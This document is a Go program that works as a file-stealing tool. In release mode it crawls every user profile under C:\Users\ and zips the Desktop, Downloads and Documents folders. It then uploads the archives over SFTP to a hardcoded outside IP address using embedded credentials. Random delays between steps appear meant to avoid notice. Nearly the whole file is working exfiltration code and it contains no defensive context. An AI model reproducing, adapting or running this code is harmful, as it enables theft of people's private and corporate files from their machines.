package main

import (
	"archive/zip"
	"io"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

const DEBUG = false

func main() {
	var target_folder string
	var sftp_host string

	if DEBUG {
		// for debugging:
		target_folder = "C:\\Users\\deadpool\\Desktop\\test2_test_folder\\"
		sftp_host = "10.100.0.70:22"
	} else {
		// for release:
		target_folder = "C:\\Users\\"
		sftp_host = "36.43.97.72:22"
	}

	log.Printf("[i] Searching target folder %#v for targets\n", target_folder)

	target_dirs := get_target_dirs(target_folder)

	log.Println("[i] Creating zips of target folders and files.")

	var zip_files []string
	for path, name := range target_dirs {
		zip_name := name + ".zip"
		if !create_zip(path, zip_name) {
			log.Printf("  [!] Error creating zip %#v %#v\n", path, zip_name)
		} else {
			zip_files = append(zip_files, zip_name)
		}
		if !DEBUG {
			time.Sleep(time.Duration(rand.Intn(16)+15) * time.Second)
		}
	}

	if len(zip_files) == 0 {
		log.Fatal("  [!] No zip files were created, exiting.")
	}

	log.Println("[+] Done creating zips.")
	log.Println("[i] Uploading zip files.")

	conn := establish_ssh(sftp_host)
	client := establish_sftp(conn)

	for _, zip_name := range zip_files {
		upload_file(zip_name, client)
		if !DEBUG {
			time.Sleep(time.Duration(rand.Intn(16)+15) * time.Second)
		}
	}

	fi, err := client.ReadDir("./uploads/")
	if err != nil {
		log.Printf("[!] Unable to list remote files: %#v\n", err)
	} else {
		log.Println("[i] Files in SFTP server:")
		for _, f := range fi {
			log.Println(f.Name())
		}
	}

	client.Close()
	conn.Close()

	log.Println("[+] Done uploading zip files.")
}

// gets the paths for all "Desktop", "Downloads" and "Documents" in the C:\Users\*\ directories
func get_target_dirs(target_folder string) map[string]string {
	target_dirs := make(map[string]string)

	entries, err := os.ReadDir(target_folder)
	if err != nil {
		log.Printf("  [!] Error reading directory %#v\n", target_folder)
		log.Fatal(err)
	}

	for _, e := range entries {
		if e.IsDir() {
			subentries, err := os.ReadDir(target_folder + e.Name())
			if err != nil {
				log.Printf("  [!] Error reading directory %#v\n", target_folder)
				log.Print(err)
			} else {
				for _, f := range subentries {
					if (f.Name() == "Desktop") || (f.Name() == "Downloads") || (f.Name() == "Documents") {
						path := target_folder + e.Name() + "\\" + f.Name()
						name := e.Name() + "_" + f.Name()
						target_dirs[path] = name
						log.Printf("[i] Found valid target directory %#v\n", path)
					} else {
						log.Printf("[i] Skipping directory %#v\n", target_folder+e.Name()+"\\"+f.Name())
					}
				}
			}
		}
	}

	log.Println("[+] Done searching for target directories. Found directories:")

	for path := range target_dirs {
		log.Printf("%#v\n", path)
	}

	return target_dirs
}

// https://stackoverflow.com/questions/37869793/how-do-i-zip-a-directory-containing-sub-directories-or-files-in-golang
func create_zip(path string, zip_name string) bool {
	log.Printf("[i] Creating zip %#v for path %#v\n", zip_name, path)
	file, err := os.Create(zip_name)
	if err != nil {
		log.Printf("  [!] Error creating zip file %#v\n", zip_name)
		log.Println(err)
		return false
	}
	defer file.Close()

	w := zip.NewWriter(file)
	defer w.Close()

	walker := func(subpath string, info os.FileInfo, err error) error {
		log.Printf("[i] Crawling: %#v\n", subpath)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		file, err := os.Open(subpath)
		if err != nil {
			log.Printf("  [!] Skipping file %#v due to error opening file:\n", subpath)
			log.Println(err)
			return nil
		}
		defer file.Close()

		localpath := strings.Replace(subpath, path+"\\", "", -1)
		log.Printf("[i] Creating entry %#v for %#v in %#v\n", localpath, subpath, zip_name)
		f, err := w.Create(localpath)
		if err != nil {
			log.Printf("  [!] Skipping file %#v due to error creating file in zip:\n", localpath)
			log.Println(err)
			return nil
		}

		_, err = io.Copy(f, file)
		if err != nil {
			log.Printf("  [!] Skipping file %#v due to error copying file:\n", localpath)
			log.Println(err)
			return nil
		}

		return nil
	}

	err = filepath.Walk(path, walker)
	if err != nil {
		log.Printf("  [!] Error walking path %#v", path)
		log.Println(err)
		return false
	}

	log.Printf("[+] Finished zip: %#v\n", zip_name)
	return true
}

func establish_ssh(sftp_host string) *ssh.Client {
	user := "sftp_user"
	pass := "Password1!"
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	host := sftp_host
	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		log.Fatal(err)
	}

	return conn
}

// open an SFTP session over an existing ssh connection.
func establish_sftp(conn *ssh.Client) *sftp.Client {
	client, err := sftp.NewClient(conn)
	if err != nil {
		log.Fatal(err)
	}

	return client
}

func upload_file(name string, client *sftp.Client) {
	log.Printf("[i] Uploading file: %#v\n", name)
	file, err := os.Open(name)
	if err != nil {
		log.Printf("  [!] Error opening file to upload: %#v\n", name)
		log.Println(err)
		return
	}

	f, err := client.Create("./uploads/" + name)
	if err != nil {
		log.Printf("  [!] Error creating remote file: %#v\n", name)
		log.Println(err)
		return
	}

	written, err := io.Copy(f, file)
	if err != nil {
		log.Printf("  [!] Error writing remote file: %#v\n", name)
		log.Println(err)
		return
	}
	if written == 0 {
		log.Printf("  [!] Error writing remote file, 0 bytes written: %#v\n", name)
		return
	}
}
